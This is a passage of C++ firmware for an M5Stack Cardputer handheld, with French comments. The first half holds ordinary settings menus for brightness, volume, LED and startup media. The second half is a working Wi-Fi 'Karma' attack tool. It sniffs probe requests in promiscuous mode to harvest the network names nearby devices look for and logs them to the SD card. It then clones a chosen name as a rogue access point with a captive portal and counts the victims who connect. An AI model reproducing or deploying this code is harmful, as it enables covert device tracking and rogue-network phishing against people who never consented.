        options.clear();  // Vider les options à chaque itération pour les mettre à jour dynamiquement

        options.push_back({"Brightness", brightness}); 
        options.push_back({soundOn ? "Sound Off" : "Sound On", []() {toggleSound();}});
        options.push_back({ledOn ? "LED Off" : "LED On", []() {toggleLED();}});
        options.push_back({"Set Startup Image", setStartupImage}); 
        options.push_back({"Set Startup Volume", adjustVolume});
        options.push_back({"Set Startup Sound", setStartupSound});

        loopOptions(options, false, true, "Settings");

        // Vérifie si BACKSPACE a été pressé pour quitter le menu
        if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
            continueSettingsMenu = false;
        }
    }
    inMenu = true;
}

void saveStartupSoundConfig(const String& paramValue) {
    // Lire le contenu du fichier de configuration
    File file = SD.open(configFilePath, FILE_READ);
    String content = "";
    bool found = false;

    if (file) {
        while (file.available()) {
            String line = file.readStringUntil('\n');
            if (line.startsWith("startupSound=")) {
                // Remplacer la ligne existante par la nouvelle valeur
                content += "startupSound=/audio/" + paramValue + "\n";
                found = true;
            } else {
                // Conserver les autres lignes
                content += line + "\n";
            }
        }
        file.close();
    }

    // Si la clé n'a pas été trouvée, l'ajouter à la fin
    if (!found) {
        content += "startupSound=/audio/" + paramValue + "\n";
    }

    // Réécrire tout le fichier de configuration
    file = SD.open(configFilePath, FILE_WRITE);
    if (file) {
        file.print(content);
        file.close();
    }
}

void loadStartupSoundConfig() {
    File file = SD.open(configFilePath, FILE_READ);
    if (file) {
        while (file.available()) {
            String line = file.readStringUntil('\n');
            if (line.startsWith("startupSound")) {
                selectedStartupSound = line.substring(line.indexOf('=') + 1);
                break;
            }
        }
        file.close();
    }
}

void setStartupSound() {
    File root = SD.open("/audio");
    std::vector<String> sounds;

    while (File file = root.openNextFile()) {
        if (!file.isDirectory()) {
            String fileName = file.name();
            if (fileName.endsWith(".mp3")) {
                sounds.push_back(fileName);
            }
        }
        file.close();
    }
    root.close();

    if (sounds.size() == 0) {
        M5.Display.clear();
        M5.Display.println("No sounds found");
        delay(2000);
        return;
    }

    int currentSoundIndex = 0;
    bool soundSelected = false;
    const int maxDisplayItems = 10;  // Nombre maximum d'éléments à afficher en même temps
    int menuStartIndex = 0;
    bool needDisplayUpdate = true;

    enterDebounce();
    while (!soundSelected) {
        if (needDisplayUpdate) {
            M5.Display.clear();
            M5.Display.setCursor(0, 0);
            M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
            M5.Display.println("Select Startup Sound:");

            for (int i = 0; i < maxDisplayItems && (menuStartIndex + i) < sounds.size(); i++) {
                int itemIndex = menuStartIndex + i;
                if (itemIndex == currentSoundIndex) {
                    M5.Display.setTextColor(TFT_GREEN, TFT_NAVY); // Sélectionner la couleur
                } else {
                    M5.Display.setTextColor(TFT_WHITE, TFT_BLACK); // Non sélectionné
                }
                M5.Display.println(sounds[itemIndex]);
            }

            needDisplayUpdate = false; // Réinitialiser le besoin de mise à jour
        }

        M5.update();
        M5Cardputer.update();

        if (M5Cardputer.Keyboard.isKeyPressed(';')) {
            currentSoundIndex = (currentSoundIndex - 1 + sounds.size()) % sounds.size();
            if (currentSoundIndex < menuStartIndex) {
                menuStartIndex = currentSoundIndex;
            } else if (currentSoundIndex >= menuStartIndex + maxDisplayItems) {
                menuStartIndex = currentSoundIndex - maxDisplayItems + 1;
            }
            needDisplayUpdate = true; // Marquer pour mise à jour de l'affichage
        } else if (M5Cardputer.Keyboard.isKeyPressed('.')) {
            currentSoundIndex = (currentSoundIndex + 1) % sounds.size();
            if (currentSoundIndex >= menuStartIndex + maxDisplayItems) {
                menuStartIndex = currentSoundIndex - maxDisplayItems + 1;
            } else if (currentSoundIndex < menuStartIndex) {
                menuStartIndex = currentSoundIndex;
            }
            needDisplayUpdate = true; // Marquer pour mise à jour de l'affichage
        } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
            // Enregistrer le son sélectionné dans la configuration
            selectedStartupSound = sounds[currentSoundIndex];
            saveStartupSoundConfig(selectedStartupSound);
            M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
            M5.Display.fillScreen(TFT_BLACK);
            M5.Display.setCursor(0, M5.Display.height() / 2);
            M5.Display.print("Startup sound set to\n" + selectedStartupSound);
            delay(1000);
            soundSelected = true;
        } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
            soundSelected = true;
        } else if (M5Cardputer.Keyboard.isKeyPressed('p')) {  // Lire le son sélectionné
            String soundPath = "/audio/" + sounds[currentSoundIndex];
            play(soundPath.c_str());  // Utilise la fonction play() pour lire le son
            while (mp3.isRunning()) {
                if (!mp3.loop()) {
                    mp3.stop();
                }
                delay(1);  // Petite pause pour éviter de surcharger le processeur
            }
        }

        delay(150);  // Anti-rebond pour les touches
    }
}


void saveStartupImageConfig(const String& paramValue) {
    // Lire le contenu du fichier de configuration
    File file = SD.open(configFilePath, FILE_READ);
    String content = "";
    bool found = false;

    if (file) {
        while (file.available()) {
            String line = file.readStringUntil('\n');
            if (line.startsWith("startupImage=")) {
                // Remplacer la ligne existante par la nouvelle valeur
                content += "startupImage=/img/" + paramValue + "\n";
                found = true;
            } else {
                // Conserver les autres lignes
                content += line + "\n";
            }
        }
        file.close();
    }

    // Si la clé n'a pas été trouvée, l'ajouter à la fin
    if (!found) {
        content += "startupImage=/img/" + paramValue + "\n";
    }

    // Réécrire tout le fichier de configuration
    file = SD.open(configFilePath, FILE_WRITE);
    if (file) {
        file.print(content);
        file.close();
    }
}


void loadStartupImageConfig() {
    File file = SD.open(configFilePath, FILE_READ);
    if (file) {
        while (file.available()) {
            String line = file.readStringUntil('\n');
            if (line.startsWith("startupImage")) {
                selectedStartupImage = line.substring(line.indexOf('=') + 1);
                break;
            }
        }
        file.close();
    }
}

void setStartupImage() {
    File root = SD.open("/img");
    std::vector<String> images;
    
    while (File file = root.openNextFile()) {
        if (!file.isDirectory()) {
            String fileName = file.name();
            if (fileName.endsWith(".jpg")) {
                images.push_back(fileName);
            }
        }
        file.close();
    }
    root.close();

    if (images.size() == 0) {
        M5.Display.clear();
        M5.Display.println("No images found");
        delay(2000);
        return;
    }

    int currentImageIndex = 0;
    bool imageSelected = false;
    const int maxDisplayItems = 10;  // Nombre maximum d'éléments à afficher en même temps
    int menuStartIndex = 0;
    bool needDisplayUpdate = true;

    enterDebounce();
    while (!imageSelected) {
        if (needDisplayUpdate) {
            M5.Display.clear();
            M5.Display.setCursor(0, 0);
            M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
            M5.Display.println("Select Startup Image:");

            for (int i = 0; i < maxDisplayItems && (menuStartIndex + i) < images.size(); i++) {
                int itemIndex = menuStartIndex + i;
                if (itemIndex == currentImageIndex) {
                    M5.Display.setTextColor(TFT_GREEN, TFT_NAVY); // Sélectionner la couleur
                } else {
                    M5.Display.setTextColor(TFT_WHITE, TFT_BLACK); // Non sélectionné
                }
                M5.Display.println(images[itemIndex]);
            }

            needDisplayUpdate = false; // Réinitialiser le besoin de mise à jour
        }

        M5.update();
        M5Cardputer.update();

        if (M5Cardputer.Keyboard.isKeyPressed(';')) {
            currentImageIndex = (currentImageIndex - 1 + images.size()) % images.size();
            if (currentImageIndex < menuStartIndex) {
                menuStartIndex = currentImageIndex;
            } else if (currentImageIndex >= menuStartIndex + maxDisplayItems) {
                menuStartIndex = currentImageIndex - maxDisplayItems + 1;
            }
            needDisplayUpdate = true; // Marquer pour mise à jour de l'affichage
        } else if (M5Cardputer.Keyboard.isKeyPressed('.')) {
            currentImageIndex = (currentImageIndex + 1) % images.size();
            if (currentImageIndex >= menuStartIndex + maxDisplayItems) {
                menuStartIndex = currentImageIndex - maxDisplayItems + 1;
            } else if (currentImageIndex < menuStartIndex) {
                menuStartIndex = currentImageIndex;
            }
            needDisplayUpdate = true; // Marquer pour mise à jour de l'affichage
        } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
            // Enregistrer l'image sélectionnée dans la configuration
            selectedStartupImage = images[currentImageIndex];
            saveStartupImageConfig(selectedStartupImage);
            String ThisImg = "/img/" + images[currentImageIndex];
            drawImage(ThisImg.c_str());
            delay(1000);
            M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
            M5.Display.fillScreen(TFT_BLACK);
            M5.Display.setCursor(0, M5.Display.height() / 2);
            M5.Display.print("Startup image set to\n" + selectedStartupImage);
            delay(1000);
            imageSelected = true;
        } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
            imageSelected = true;
        } else if (M5Cardputer.Keyboard.isKeyPressed('p')) {  // Lire le son sélectionné            
            String ThisImg = "/img/" + images[currentImageIndex];
            drawImage(ThisImg.c_str());
            delay(1500);
            needDisplayUpdate = true; // Marquer pour mise à jour de l'affichage
        }
        delay(150);  // Anti-rebond pour les touches
    }
}



void toggleSound() {
    inMenu = false;
    soundOn = !soundOn;  // Inverse l'état du son

    // Sauvegarde le nouvel état dans le fichier de configuration
    saveConfigParameter("soundOn", soundOn);
    M5.Display.fillScreen(TFT_BLACK);
    M5.Display.setCursor(M5.Display.width() / 2 - 72, M5.Display.height() / 2);
    M5.Display.print("Sound " + String(soundOn ? "On" : "Off"));
    delay(1000);
}

void toggleLED() {
    inMenu = false;
    ledOn = !ledOn;  // Inverse l'état du LED

    // Sauvegarde le nouvel état dans le fichier de configuration
    saveConfigParameter("ledOn", ledOn);
    M5.Display.fillScreen(TFT_BLACK);
    M5.Display.setCursor(M5.Display.width() / 2 - 72, M5.Display.height() / 2);
    M5.Display.print("LED " + String(ledOn ? "On" : "Off"));
    delay(1000);
    
}

void brightness() {
  int currentBrightness = M5.Display.getBrightness();
  int minBrightness = 1;
  int maxBrightness = 255;

  M5.Display.clear();
  M5.Display.setTextSize(1.5);
  M5.Display.setTextColor(TFT_WHITE);

  bool brightnessAdjusted = true;
  unsigned long lastKeyPressTime = 0;
  const unsigned long debounceDelay = 200;  // Définir un délai de debounce de 200 ms

  enterDebounce();

  while (true) {
    M5.update();
    M5Cardputer.update();
    handleDnsRequestSerial();

    if (millis() - lastKeyPressTime > debounceDelay) {
      if (M5Cardputer.Keyboard.isKeyPressed(',')) {
        currentBrightness = max(minBrightness, currentBrightness - 12);
        brightnessAdjusted = true;
        lastKeyPressTime = millis();
      } else if (M5Cardputer.Keyboard.isKeyPressed('/')) {
        currentBrightness = min(maxBrightness, currentBrightness + 12);
        brightnessAdjusted = true;
        lastKeyPressTime = millis();
      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
        saveConfigParameter("brightness", currentBrightness);
        break;
      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
        inMenu = true;
        drawMenu();
        break;
      }
    }

    if (brightnessAdjusted) {
      float brightnessPercentage = 100.0 * (currentBrightness - minBrightness) / (maxBrightness - minBrightness);
      M5.Display.fillScreen(TFT_BLACK);
      M5.Display.setCursor(50, M5.Display.height() / 2);
      M5.Display.print("Brightness: ");
      M5.Display.print((int)brightnessPercentage);
      M5.Display.println("%");
      M5.Display.setBrightness(currentBrightness);
      M5.Display.display();
      brightnessAdjusted = false;
    }
  }

  float finalBrightnessPercentage = 100.0 * (currentBrightness - minBrightness) / (maxBrightness - minBrightness);
  M5.Display.fillScreen(TFT_BLACK);
  M5.Display.setCursor(0, M5.Display.height() / 2);
  M5.Display.print("Brightness set to " + String((int)finalBrightnessPercentage) + "%");
  delay(1000);
}


void adjustVolume() {
    int currentVolume = M5Cardputer.Speaker.getVolume();  // Récupère le volume actuel
    int minVolume = 0;  // Volume minimum
    int maxVolume = 255;  // Volume maximum

    M5.Display.clear();
    M5.Display.setTextSize(1.5);
    M5.Display.setTextColor(TFT_WHITE);

    bool volumeAdjusted = true;
    unsigned long lastKeyPressTime = 0;
    const unsigned long debounceDelay = 200;  // Définir un délai de debounce de 200 ms

    enterDebounce();

    while (true) {
        M5.update();
        M5Cardputer.update();

        if (millis() - lastKeyPressTime > debounceDelay) {
            if (M5Cardputer.Keyboard.isKeyPressed(',')) {
                currentVolume = max(minVolume, currentVolume - 12);
                volumeAdjusted = true;
                lastKeyPressTime = millis();
            } else if (M5Cardputer.Keyboard.isKeyPressed('/')) {
                currentVolume = min(maxVolume, currentVolume + 12);
                volumeAdjusted = true;
                lastKeyPressTime = millis();
            } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
                saveConfigParameter("volume", currentVolume);
                break;
            } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
                inMenu = true;
                drawMenu();
                break;
            }
        }

        if (volumeAdjusted) {
            float volumePercentage = 100.0 * (currentVolume - minVolume) / (maxVolume - minVolume);
            M5.Display.fillScreen(TFT_BLACK);
            M5.Display.setCursor(50, M5.Display.height() / 2);
            M5.Display.print("Volume: ");
            M5.Display.print((int)volumePercentage);
            M5.Display.println("%");
            M5Cardputer.Speaker.setVolume(currentVolume);
            M5.Display.display();
            volumeAdjusted = false;
        }
    }

    float finalVolumePercentage = 100.0 * (currentVolume - minVolume) / (maxVolume - minVolume);
    M5.Display.fillScreen(TFT_BLACK);
    M5.Display.setCursor(50, M5.Display.height() / 2);
    M5.Display.print("Volume set to " + String((int)finalVolumePercentage) + "%");
    delay(1000);
}



void saveConfigParameter(String key, int value) {
  if (!SD.exists(configFolderPath)) {
    SD.mkdir(configFolderPath);
  }

  String content = "";
  File configFile = SD.open(configFilePath, FILE_READ);
  if (configFile) {
    while (configFile.available()) {
      content += configFile.readStringUntil('\n') + '\n';
    }
    configFile.close();
  } else {
    Serial.println("Error when opening config.txt for reading");
    return;
  }

  int startPos = content.indexOf(key + "=");
  if (startPos != -1) {
    int endPos = content.indexOf('\n', startPos);
    String oldValue = content.substring(startPos, endPos);
    content.replace(oldValue, key + "=" + String(value));
  } else {
    content += key + "=" + String(value) + "\n";
  }

  configFile = SD.open(configFilePath, FILE_WRITE);
  if (configFile) {
    configFile.print(content);
    configFile.close();
    Serial.println(key + " saved!");
  } else {
    Serial.println("Error when opening config.txt for writing");
  }
}



void restoreConfigParameter(String key) {
  if (SD.exists(configFilePath)) {
    File configFile = SD.open(configFilePath, FILE_READ);
    if (configFile) {
      String line;
      String stringValue;
      int intValue = -1;
      bool boolValue = false;
      bool keyFound = false;

      while (configFile.available()) {
        line = configFile.readStringUntil('\n');
        if (line.startsWith(key + "=")) {
          stringValue = line.substring(line.indexOf('=') + 1);
          if (key == "brightness") {
            intValue = stringValue.toInt();
            M5.Display.setBrightness(intValue);
            Serial.println("Brightness restored to " + String(intValue));
          } else if (key == "volume") {
            intValue = stringValue.toInt();
            M5Cardputer.Speaker.setVolume(intValue);
            Serial.println("Volume restored to " + String(intValue));
          } else if (key == "ledOn" || key == "soundOn") {
            boolValue = (stringValue == "1");
            Serial.println(key + " restored to " + String(boolValue));
          }
          keyFound = true;
          break;
        }
      }
      configFile.close();

      if (!keyFound) {
        Serial.println("Key not found in config, using default for " + key);
        if (key == "brightness") {
          M5.Display.setBrightness(defaultBrightness);
        } else if (key == "volume") {
          M5Cardputer.Speaker.setVolume(180); // Par défaut à 70% du volume maximum
        } else if (key == "ledOn") {
          boolValue = false;  // Default to LED off
        } else if (key == "soundOn") {
          boolValue = false;  // Default to sound off
        }
      }

      if (key == "ledOn") {
        ledOn = boolValue;
      } else if (key == "soundOn") {
        soundOn = boolValue;
      }

    } else {
      Serial.println("Error when opening config.txt");
    }
  } else {
    Serial.println("Config file not found, using default values");
    if (key == "brightness") {
      M5.Display.setBrightness(defaultBrightness);
    } else if (key == "volume") {
      M5Cardputer.Speaker.setVolume(180); // Par défaut à 70% du volume maximum
    } else if (key == "ledOn") {
      ledOn = false;  // Default to LED off
    } else if (key == "soundOn") {
      soundOn = false;  // Default to sound off
    }
  }
}






//KARMA-PART-FUNCTIONS

void packetSnifferKarma(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!isScanningKarma || type != WIFI_PKT_MGMT) return;

  const wifi_promiscuous_pkt_t *packet = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t *frame = packet->payload;
  const uint8_t frame_type = frame[0];

  if (ssid_count_Karma == 0) {
    M5.Display.setCursor(8, M5.Display.height() / 2 - 10);
    M5.Display.println("Waiting for probe...");
  }

  if (frame_type == 0x40) { // Probe Request Frame
    uint8_t ssid_length_Karma = frame[25];
    if (ssid_length_Karma >= 1 && ssid_length_Karma <= 32) {
      char ssidKarma[33] = {0};
      memcpy(ssidKarma, &frame[26], ssid_length_Karma);
      ssidKarma[ssid_length_Karma] = '\0';
      if (strlen(ssidKarma) == 0 || strspn(ssidKarma, " ") == strlen(ssidKarma)) {
        return;
      }

      bool ssidExistsKarma = false;
      for (int i = 0; i < ssid_count_Karma; i++) {
        if (strcmp(ssidsKarma[i], ssidKarma) == 0) {
          ssidExistsKarma = true;
          break;
        }
      }


      if (isSSIDWhitelisted(ssidKarma)) {
        if (seenWhitelistedSSIDs.find(ssidKarma) == seenWhitelistedSSIDs.end()) {
          seenWhitelistedSSIDs.insert(ssidKarma);
          Serial.println("SSID in whitelist, ignoring: " + String(ssidKarma));
        }
        return;
      }

      if (!ssidExistsKarma && ssid_count_Karma < MAX_SSIDS_Karma) {
        strcpy(ssidsKarma[ssid_count_Karma], ssidKarma);
        updateDisplayWithSSIDKarma(ssidKarma, ++ssid_count_Karma);
        Serial.print("Found: ");
        if (ledOn) {
          pixels.setPixelColor(0, pixels.Color(255, 0, 0));
          pixels.show();
          delay(50);

          pixels.setPixelColor(0, pixels.Color(0, 0, 0));
          pixels.show();
          delay(50);
        }
        Serial.println(ssidKarma);
      }
    }
  }
}

void saveSSIDToFile(const char* ssid) {
  bool ssidExists = false;
  File readfile = SD.open("/probes.txt", FILE_READ);
  if (readfile) {
    while (readfile.available()) {
      String line = readfile.readStringUntil('\n');
      if (line.equals(ssid)) {
        ssidExists = true;
        break;
      }
    }
    readfile.close();
  }
  if (!ssidExists) {
    File file = SD.open("/probes.txt", FILE_APPEND);
    if (file) {
      file.println(ssid);
      file.close();
    } else {
      Serial.println("Error opening probes.txt");
    }
  }
}


void updateDisplayWithSSIDKarma(const char* ssidKarma, int count) {
 const int maxLength = 22;
  char truncatedSSID[maxLength + 1];  // Adjusted size to maxLength to fix bufferoverflow

  M5.Display.fillRect(0, 0, M5.Display.width(), M5.Display.height() - 27, TFT_BLACK);
  int startIndexKarma = max(0, count - maxMenuDisplay);

  for (int i = startIndexKarma; i < count; i++) {
    if (i >= MAX_SSIDS_Karma) {  // Safety check to avoid out-of-bounds access
      break;
    }

    int lineIndexKarma = i - startIndexKarma;
    M5.Display.setCursor(0, lineIndexKarma * 12);

    if (strlen(ssidsKarma[i]) > maxLength) {
      strncpy(truncatedSSID, ssidsKarma[i], maxLength);
      truncatedSSID[maxLength] = '\0';  // Properly null-terminate
      M5.Display.printf("%d.%s", i + 1, truncatedSSID);
    } else {
      M5.Display.printf("%d.%s", i + 1, ssidsKarma[i]);
    }
  }
  if (count <= 9) {
    M5.Display.fillRect(M5.Display.width() - 15 * 1.5 / 2, 0, 15 * 1.5 / 2, 15, TFT_DARKGREEN);
    M5.Display.setCursor(M5.Display.width() - 13 * 1.5 / 2, 3);
  } else if (count >= 10 && count <= 99) {
    M5.Display.fillRect(M5.Display.width() - 30 * 1.5 / 2, 0, 30 * 1.5 / 2, 15, TFT_DARKGREEN);
    M5.Display.setCursor(M5.Display.width() - 27 * 1.5 / 2, 3);
  } else if (count >= 100 && count < MAX_SSIDS_Karma * 0.7) {
    M5.Display.fillRect(M5.Display.width() - 45 * 1.5 / 2, 0, 45 * 1.5 / 2, 15, TFT_ORANGE);
    M5.Display.setTextColor(TFT_BLACK);
    M5.Display.setCursor(M5.Display.width() - 42 * 1.5 / 2, 3);
    M5.Display.setTextColor(TFT_WHITE);
  } else {
    M5.Display.fillRect(M5.Display.width() - 45 * 1.5 / 2, 0, 45 * 1.5 / 2, 15, TFT_RED);
    M5.Display.setCursor(M5.Display.width() - 42 * 1.5 / 2, 3);
  }
  if (count == MAX_SSIDS_Karma) {
    M5.Display.printf("MAX");
  } else {
    M5.Display.printf("%d", count);
  }
  M5.Display.display();
}


void drawStartButtonKarma() {
  M5.Display.clear();
  M5.Display.fillRect(0, M5.Display.height() - 30, M5.Display.width(), 30, TFT_GREEN);
  M5.Display.setCursor(M5.Display.width() / 2 - 24 , M5.Display.height() - 20);
  M5.Display.setTextColor(TFT_BLACK);
  M5.Display.println("Start Sniff");
  M5.Display.setTextColor(TFT_WHITE);
}

void drawStopButtonKarma() {
  M5.Display.fillRect(0, M5.Display.height() - 27, M5.Display.width(), 27, TFT_RED);
  M5.Display.setCursor(M5.Display.width() / 2 - 60, M5.Display.height() - 20);
  M5.Display.println("Stop Sniff");
  M5.Display.setTextColor(TFT_WHITE);
}

void startScanKarma() {
  isScanningKarma = true;
  ssid_count_Karma = 0;
  M5.Display.clear();
  drawStopButtonKarma();
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_deinit();
  delay(300); //petite pause
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&packetSnifferKarma);

  readConfigFile("/config/config.txt");
  seenWhitelistedSSIDs.clear();

  Serial.println("-------------------");
  Serial.println("Probe Sniffing Started...");
  Serial.println("-------------------");
}


void stopScanKarma() {
  Serial.println("-------------------");
  Serial.println("Sniff Stopped. SSIDs found: " + String(ssid_count_Karma));
  Serial.println("-------------------");
  isScanningKarma = false;
  esp_wifi_set_promiscuous(false);


  if (stopProbeSniffingViaSerial && ssid_count_Karma > 0) {
    Serial.println("Saving SSIDs to SD card automatically...");
    for (int i = 0; i < ssid_count_Karma; i++) {
      saveSSIDToFile(ssidsKarma[i]);
    }
    Serial.println(String(ssid_count_Karma) + " SSIDs saved on SD.");
  } else if (isProbeSniffingMode && ssid_count_Karma > 0) {
    delay(1500);
    bool saveSSID = confirmPopup("   Save " + String(ssid_count_Karma) + " SSIDs?");
    if (saveSSID) {
      M5.Display.clear();
      M5.Display.setCursor(0 , M5.Display.height() / 2 );
      M5.Display.println("Saving SSIDs on SD..");
      for (int i = 0; i < ssid_count_Karma; i++) {
        saveSSIDToFile(ssidsKarma[i]);
      }
      M5.Display.clear();
      M5.Display.setCursor(0 , M5.Display.height() / 2 );
      M5.Display.println(String(ssid_count_Karma) + " SSIDs saved on SD.");
      Serial.println("-------------------");
      Serial.println(String(ssid_count_Karma) + " SSIDs saved on SD.");
      Serial.println("-------------------");
    } else {
      M5.Display.clear();
      M5.Display.setCursor(0 , M5.Display.height() / 2 );
      M5.Display.println("  No SSID saved.");
    }
    delay(1000);
    memset(ssidsKarma, 0, sizeof(ssidsKarma));
    ssid_count_Karma = 0;
  }


  menuSizeKarma = ssid_count_Karma;
  currentIndexKarma = 0;
  menuStartIndexKarma = 0;

  if (isKarmaMode && ssid_count_Karma > 0) {
    drawMenuKarma();
    currentStateKarma = StopScanKarma;
  } else {
    currentStateKarma = StartScanKarma;
    inMenu = true;
    drawMenu();
  }
  isKarmaMode = false;
  isProbeSniffingMode = false;
  stopProbeSniffingViaSerial = false;
}


void handleMenuInputKarma() {
  bool stateChanged = false;
  static unsigned long lastKeyPressTime = 0;
  const unsigned long debounceDelay = 200; // Temps en millisecondes pour ignorer les pressions supplémentaires
  static bool keyHandled = false;
  enterDebounce();
  M5.update();
  M5Cardputer.update();

  if (millis() - lastKeyPressTime > debounceDelay) {
    if (M5Cardputer.Keyboard.isKeyPressed(';') && !keyHandled) {
      currentIndexKarma--;
      if (currentIndexKarma < 0) {
        currentIndexKarma = menuSizeKarma - 1; // Boucle retour à la fin si en dessous de zéro
      }
      stateChanged = true;
      lastKeyPressTime = millis();
      keyHandled = true;
    } else if (M5Cardputer.Keyboard.isKeyPressed('.') && !keyHandled) {
      currentIndexKarma++;
      if (currentIndexKarma >= menuSizeKarma) {
        currentIndexKarma = 0; // Boucle retour au début si dépassé la fin
      }
      stateChanged = true;
      lastKeyPressTime = millis();
      keyHandled = true;
    } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && !keyHandled) {
      executeMenuItemKarma(currentIndexKarma);
      stateChanged = true;
      lastKeyPressTime = millis();
      keyHandled = true;
    }

    // Réinitialisation de keyHandled si aucune des touches concernées n'est actuellement pressée
    if (!M5Cardputer.Keyboard.isKeyPressed(';') && !M5Cardputer.Keyboard.isKeyPressed('.') && !M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
      keyHandled = false;
    }
  }

  if (stateChanged) {
    // Ajustement de l'indice de départ pour l'affichage du menu si nécessaire
    menuStartIndexKarma = max(0, min(currentIndexKarma, menuSizeKarma - maxMenuDisplayKarma));
    drawMenuKarma();  // Redessiner le menu avec le nouvel indice sélectionné
  }
}

void drawMenuKarma() {
  M5.Display.clear();
  M5.Display.setTextSize(1.5);
  M5.Display.setTextFont(1);

  int lineHeight = 12;
  int startX = 0;
  int startY = 6;

  for (int i = 0; i < maxMenuDisplayKarma; i++) {
    int menuIndexKarma = menuStartIndexKarma + i;
    if (menuIndexKarma >= menuSizeKarma) break;

    if (menuIndexKarma == currentIndexKarma) {
      M5.Display.fillRect(0, i * lineHeight, M5.Display.width(), lineHeight, TFT_NAVY);
      M5.Display.setTextColor(TFT_GREEN);
    } else {
      M5.Display.setTextColor(TFT_WHITE);
    }
    M5.Display.setCursor(startX, startY + i * lineHeight + (lineHeight / 2) - 11);
    M5.Display.println(ssidsKarma[menuIndexKarma]);
  }
  M5.Display.display();
}

void executeMenuItemKarma(int indexKarma) {
  if (indexKarma >= 0 && indexKarma < ssid_count_Karma) {
    startAPWithSSIDKarma(ssidsKarma[indexKarma]);
  } else {
    M5.Display.clear();
    M5.Display.println("Selection invalide!");
    delay(1000);
    drawStartButtonKarma();
    currentStateKarma = StartScanKarma;
  }
}

void startAPWithSSIDKarma(const char* ssid) {
  clonedSSID = String(ssid);
  isProbeKarmaAttackMode = true;
  readConfigFile("/config/config.txt");
  createCaptivePortal();

  Serial.println("-------------------");
  Serial.println("Karma Attack started for : " + String(ssid));
  Serial.println("-------------------");

  M5.Display.clear();
  unsigned long startTime = millis();
  unsigned long currentTime;
  int remainingTime;
  int clientCount = 0;
  int scanTimeKarma = 60; // Scan time for karma attack (not for Karma Auto)

  while (true) {
    M5.update();
    M5Cardputer.update();
    handleDnsRequestSerial();
    currentTime = millis();
    remainingTime = scanTimeKarma - ((currentTime - startTime) / 1000);
    clientCount = WiFi.softAPgetStationNum();
    M5.Lcd.setTextColor(TFT_WHITE, TFT_BLACK);
    M5.Display.setCursor((M5.Display.width() - 12 * strlen(ssid)) / 2, 25);
    M5.Display.println(String(ssid));

    M5.Display.setCursor(10, 45);
    M5.Display.print("Left Time: ");
    M5.Display.print(remainingTime);
    M5.Display.println(" s");

    M5.Display.setCursor(10, 65);
    M5.Display.print("Connected Client: ");
    M5.Display.println(clientCount);

    Serial.println("---Karma-Attack---");
    Serial.println("On :" + String(ssid));
    Serial.println("Left Time: " + String(remainingTime) + "s");
    Serial.println("Connected Client: " + String(clientCount));
    Serial.println("-------------------");

    M5.Lcd.setTextColor(TFT_WHITE);
    M5.Display.setCursor(33, 110);
    M5.Display.println(" Stop");
    M5.Display.display();

    if (remainingTime <= 0) {
      break;
    }
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
      break;
    } else {
      delay(200);
    }

  }
  M5.Display.clear();
  M5.Display.setCursor(15 , M5.Display.height() / 2 );
  if (clientCount > 0) {
    M5.Display.println("Karma Successful!!!");
    Serial.println("-------------------");
    Serial.println("Karma Attack worked !");
    Serial.println("-------------------");
  } else {
    M5.Display.println(" Karma Failed...");
    Serial.println("-------------------");
    Serial.println("Karma Attack failed...");
    Serial.println("-------------------");
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
  }
  delay(2000);
  if (confirmPopup("Save " + String(ssid) + " ?" )) {
    saveSSIDToFile(ssid);
  }
  lastIndex = -1;
  inMenu = true;
  isProbeKarmaAttackMode = false;
  currentStateKarma = StartScanKarma;
  memset(ssidsKarma, 0, sizeof(ssidsKarma));
  ssid_count_Karma = 0;
  drawMenu();
}


void listProbes() {
  File file = SD.open("/probes.txt", FILE_READ);
  if (!file) {
    Serial.println("Failed to open probes.txt");
    waitAndReturnToMenu("Failed to open probes.txt");
    return;
  }

  String probes[MAX_SSIDS_Karma];
  int numProbes = 0;

  while (file.available() && numProbes < MAX_SSIDS_Karma) {
    String line = file.readStringUntil('\n');
    line.trim();
    if (line.length() > 0) {
      probes[numProbes++] = line;
    }
  }
  file.close();

  if (numProbes == 0) {
    Serial.println("No probes found");
    waitAndReturnToMenu("No probes found");
    return;
  }

  const int lineHeight = 15; // Hauteur de ligne pour l'affichage des SSIDs
  const int maxDisplay = 9; // Nombre maximum de lignes affichables
  int currentListIndex = 0;
  bool needDisplayUpdate = true;
  bool keyHandled = false;

  unsigned long lastKeyPressTime = 0;
  const unsigned long debounceDelay = 200; // Temps en millisecondes pour ignorer les pressions supplémentaires
  enterDebounce();
  while (true) {
    M5.update();
    M5Cardputer.update();
    handleDnsRequestSerial();

    if (millis() - lastKeyPressTime > debounceDelay) {
      if (M5Cardputer.Keyboard.isKeyPressed(';') && !keyHandled) {
        currentListIndex = (currentListIndex - 1 + numProbes) % numProbes;
        needDisplayUpdate = true;
        lastKeyPressTime = millis();
        keyHandled = true;
      } else if (M5Cardputer.Keyboard.isKeyPressed('.') && !keyHandled) {
        currentListIndex = (currentListIndex + 1) % numProbes;
        needDisplayUpdate = true;
        lastKeyPressTime = millis();
        keyHandled = true;
